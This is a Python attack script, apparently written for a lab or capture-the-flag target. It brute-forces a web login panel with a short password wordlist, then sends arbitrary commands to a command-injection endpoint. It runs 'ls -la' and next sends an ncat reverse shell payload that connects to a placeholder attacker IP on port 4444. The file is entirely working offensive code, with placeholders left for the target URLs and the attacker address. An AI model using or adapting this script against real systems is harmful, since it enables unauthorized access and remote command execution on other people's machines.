import requests

LOGIN_URL: str = "login_page_url"  # Replace with the actual login URL
EXECUTE_URL = "EXECUTE_URL"  # Replace with the actual URL for command execution
USERNAME = "admin" # Replace with the actual username

def brute_force_login():
    """Brute forces the login panel."""
    session = requests.Session()

    wordlist = ["password", "password123", "admin123", "letmein", "qwerty", "12345"] # Example wordlist you can replace with your own or create a file with passwords

    for password in wordlist:
        print(f"[*] Trying password: {password}")
        data = {"username": USERNAME, "password": password}
        response = session.post(LOGIN_URL, data=data)

        if "Welcome" in response.text:
            print(f"[+] Login successful! Username: {USERNAME}, Password: {password}")
            return session

    print("[-] Brute force failed.")
    return None



def command_injection(session, command):
    """Exploits command injection by sending a modified drop-down value."""
    response = session.post(EXECUTE_URL, data={"cmd": command})

    if "Session expired" in response.text:
        print("[-] Session expired! Re-authenticating...")
        session = brute_force_login()
        
    if response.status_code == 200:
        print(f"[+] Command Output:\n{response.text}")
    else:
        print("[-] Exploit failed.")


def get_reverse_shell(session, attacker_ip="Attacker_IP", attacker_port=4444): # Replace with your attacker's IP and port
    """Sends a reverse shell payload."""
    payload = f"ncat {attacker_ip} {attacker_port} -e /bin/bash"

    print("[+] Sending reverse shell payload...")
    command_injection(session, payload)
    
session = brute_force_login()
if session:
    print("[+] Brute force login successful!")
    command_injection(session, "ls -la")  # Example command injection
    get_reverse_shell(session, "Attacker_IP", 4444) # Replace with your attacker's IP and port
    
    
    
    
    